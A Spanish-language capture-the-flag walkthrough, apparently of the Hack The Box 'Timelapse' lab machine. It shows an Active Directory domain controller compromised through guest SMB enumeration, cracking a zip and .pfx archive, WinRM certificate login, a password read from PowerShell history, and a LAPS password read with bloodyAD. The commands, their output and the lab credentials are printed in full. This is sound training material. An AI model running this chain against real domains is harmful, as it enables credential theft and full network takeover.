- Dificultad: **Easy**
- #bloodyAD | #ActiveDirectory | #RecursosCompartidos | #Bloodhound | #LAPS | #ReadLAPSPassword | #UserEnum 
- IP: 10.129.30.206

# Reconocimiento Inicial
**En esta seccion hago un ping para ver el ttl y si tenemos conexion a la maquina.**

Empiezo haciendo un `ping` para enviar un paquete ICMP a la victima, de esta forma podemos hacernos una idea de su sistema operativo y también si tenemos conexión a ella

```
ping -c1 10.129.30.206

PING 10.129.30.206 (10.129.30.206) 56(84) bytes of data.
64 bytes from 10.129.30.206: icmp_seq=1 ttl=127 time=78.6 ms

--- 10.129.30.206 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 78.553/78.553/78.553/0.000 ms
```

Vemos que hemos recibido el paquete de vuelta, esto quiere decir que tenemos conexión a la maquina, y también vemos un `TTL (Time To Live)` de **127** así que podemos asumir que estamos ante una maquina **Windows**.

# Enumeracion
**En esta parte aparecen los escaneos de nmap, la busqueda del codename, vulnerabilidades para las versiones de los servicios expuestos y añadir el virtualhosting en caso de que halla**

Ahora que ya sabemos a que nos enfrentamos vamos a enumerar que puertos están abiertos con nmap.

```
rustscan -a 10.129.30.206 --ulimit 5000

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.30.206:53
Open 10.129.30.206:88
Open 10.129.30.206:135
Open 10.129.30.206:139
Open 10.129.30.206:389
Open 10.129.30.206:445
Open 10.129.30.206:464
Open 10.129.30.206:593
Open 10.129.30.206:636
Open 10.129.30.206:3269
Open 10.129.30.206:3268
Open 10.129.30.206:5986
Open 10.129.30.206:9389
Open 10.129.30.206:49673
Open 10.129.30.206:49674
Open 10.129.30.206:49667
Open 10.129.30.206:49695
Open 10.129.30.206:59262
```

Hago un segundo escaneo para enumerar versiones de los servicios de dichos puertos abiertos con los scripts de enumeración de nmap

```
nmap -p53,88,135,139,389,445,464,593,636,3269,3268,5986,9389,49674,49667,49673,49695 -Pn -n -sCV --min-rate 5000 -oN target 10.129.30.206

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-05-09 04:02:59Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2026-05-09T04:04:32+00:00; +7h59m59s from scanner time.
| tls-alpn:
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49695/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
| smb2-time:
|   date: 2026-05-09T04:03:53
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
```

Vemos que tenemos el puerto 445 abiertos asi que podriamos empezar viendo si tenemos acceso de forma anonima o como usuario invitado

Usuario anonimo:
```
# FAILED
nxc smb 10.129.30.206 -u '' -p '' --shares
```

Usuario Invitado:
```
nxc smb 10.129.30.206 -u 'Guest' -p '' --shares

Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON                        Logon server share
Shares          READ
SYSVOL                          Logon server share
```

## Enumeracion de usuarios
Vemos que tenemos acceso a la carpeta compartida `IPC$` asi que podemos enumerar usuarios con `netexec`
```
nxc smb 10.129.30.206 -u 'Guest' -p '' --rid-brute | grep -oP 'TIMELAPSE\\\K[^ ]+(?=\s+\(SidTypeUser\))' | tee users.txt

Administrator
Guest
krbtgt
DC01$
thecybergeek
payl0ad
legacyy
sinfulz
babywyrm
DB01$
WEB01$
DEV01$
svc_deploy
```

## Enumeracion de recursos compartidos
Habiamos visto que teniamos acceso a una carpeta como usuario invitado `Guest` asi que vamos a entrar con `smbclient` y vamos a ver que archivos relevantes podemos sacar de ahi
```
smbclient \\\\10.129.30.206\\Shares -U 'Guest'
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \>
```

Dentro de la carpeta `DEV` podemos ver un zip interesante asi que vamos a descargarlo:
```
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 20:40:06 2021
  ..                                  D        0  Mon Oct 25 20:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 16:46:42 2021

		6367231 blocks of size 4096. 1320978 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (4.7 KiloBytes/sec) (average 4.7 KiloBytes/sec)
```

Antes de descomprimirlo vamos a ver que archivos tiene comprimidos
![[Pasted image 20260509084456.png]]

Vemos que guarda un archivo .PFX

> [!tip] Un archivo **.pfx** (también llamado PKCS#12) es un contenedor binario que almacena un certificado digital junto con su clave privada y, opcionalmente, la cadena de certificados de la CA, todo protegido por una contraseña.

Al intentar descomprimirlo vemos que tiene contraseña![[Pasted image 20260509084243.png]]

Vamos a utilizar una herramienta llamada `zip2john` para poder crackearla con `john` proximamente

```
> zip2john winrm_backup.zip > hash

> john --wordlist=/usr/share/wordlists/rockyou.txt hash
Contraseña -> supremelegacy
```

Una vez unzipeado el archivo, ya sabemos como funciona un archivo .pfx asi que vamos a utilizar otra herramienta de la suite de `johntheripper` llamada `pfx2john.py` para sacar la contraseña del pfx para poder obtener el certificado y la clave privada.

```
> pfx2john.py legacyy_dev_auth.pfx > hash2

> john --wordlist=/usr/share/wordlists/rockyou.txt hash2
Contraseña -> thuglegacy
```

ahora podemos guiarnos de este blog para obtener el certificado y la clave privada

https://rdr-it.com/es/certificado-pfx-extraiga-el-certificado-y-la-clave-privada/

> [!warning] Guardar ambos archivo con la extension .pem

# Acceso Inicial
Una vez tengamos los 2 archivos .pem podemos utilizar evil-winrm para obtener una conexion remota de comandos

```
evil-winrm -i 10.129.30.206 -u legacyy -k clave_privada.pem -c certificado.pem -S
```

`-S` -> Usar SSL (requerido si WinRM está en puerto 5986)

# legacyy > svc_deploy
Para escalar al usuario svc_deploy, despues de un buen rato investigando me da por leer el historial de powershell y descubro lo siguiente:

```
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Encontraremos las credenciales de svc_deploy -> `E3R$Q62^12p7PLlC%KWaxuaV`

# svc_deploy  > Administrator
Ahora que ya tenemos credenciales, vamos a abrir bloodhound y ver que podemos hacer con el usuario svc_deploy

![[Pasted image 20260509091517.png]]

Este usuarios forma parte del grupo `LAPS_READERS` que tiene permiso para leer la password de todos los usuarios del ordenador DC01.

> [!tip] LAPS (Local Administrator Password Solution) es una herramienta de seguridad de Microsoft que gestiona automáticamente y de forma segura las contraseñas de las cuentas de administrador local en equipos unidos a un dominio

Vamos a utilizar bloodyAD para poder leer la contraseña de administrator

```
bloodyAD --host "10.129.30.206" -d "timelapse.htb" -u "svc_deploy" -p 'E3R$Q62^12p7PLlC%KWaxuaV' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

```
evil-winrm -i 10.129.30.206 -u 'Administrator' -p 'H#fh-30xcv.MYvJV3pKb%+q2' -S
```

y ya somos Administrator
